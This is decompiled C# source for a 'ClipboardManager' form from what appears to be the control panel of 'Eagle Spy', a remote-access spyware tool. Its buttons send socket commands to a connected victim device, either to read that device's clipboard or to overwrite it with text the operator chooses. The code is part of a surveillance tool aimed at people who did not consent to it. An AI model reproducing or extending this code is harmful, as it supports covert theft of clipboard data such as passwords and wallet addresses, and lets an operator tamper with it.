using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x0200002E RID: 46
	[DesignerGenerated]
	public partial class ClipboardManager : Form
	{
		// Token: 0x06000387 RID: 903 RVA: 0x00050EF8 File Offset: 0x0004F0F8
		private void ClipboardManager_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\20.ico");
			this.Text = this.Title;
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x06000388 RID: 904 RVA: 0x00050F48 File Offset: 0x0004F148
		public ClipboardManager()
		{
			base.Load += this.ClipboardManager_Load;
			this.Title = "null";
			this.RectInputText0 = new List<Rectangle>();
			this.InitializeComponent();
			this.Font = reso.f;
		}

		// Token: 0x06000389 RID: 905 RVA: 0x000030AF File Offset: 0x000012AF
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x0600038A RID: 906 RVA: 0x00050F94 File Offset: 0x0004F194
		private void Panel1_Paint(object sender, PaintEventArgs e)
		{
			e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
			Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
			if (this.RectInputText0.Count <= 0)
			{
				return;
			}
			foreach (Rectangle rectangle in this.RectInputText0)
			{
				if (rectangle.Width > 0)
				{
					e.Graphics.FillRectangle(new SolidBrush(defaultColor_Foreground), rectangle);
				}
			}
		}

		// Token: 0x0600038B RID: 907 RVA: 0x00051020 File Offset: 0x0004F220
		private void BTN_SET_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".info",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						"set",
						Data.SPL_DATA,
						this.BoxClipboard.Text
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x0600038C RID: 908 RVA: 0x000510E8 File Offset: 0x0004F2E8
		private void BTN_GET_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".info",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getClipboard,
						Data.SPL_SOCKET,
						"get",
						Data.SPL_DATA,
						"null"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x04000311 RID: 785
		public TcpClient Client;

		// Token: 0x04000312 RID: 786
		public Client classClient;

		// Token: 0x04000313 RID: 787
		public string Title;

		// Token: 0x04000314 RID: 788
		private List<Rectangle> RectInputText0;
	}
}
